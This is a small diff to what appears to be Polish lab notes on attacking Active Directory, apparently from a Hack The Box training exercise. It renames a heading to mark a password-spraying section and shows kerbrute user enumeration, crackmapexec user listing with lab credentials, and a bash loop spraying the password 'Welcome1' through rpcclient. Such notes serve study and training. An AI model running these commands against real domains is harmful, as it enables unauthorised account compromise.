@@ -28,7 +28,7 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
       
-# Script Bash
+# Script Bash (rozpylanie)
 ```bash
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
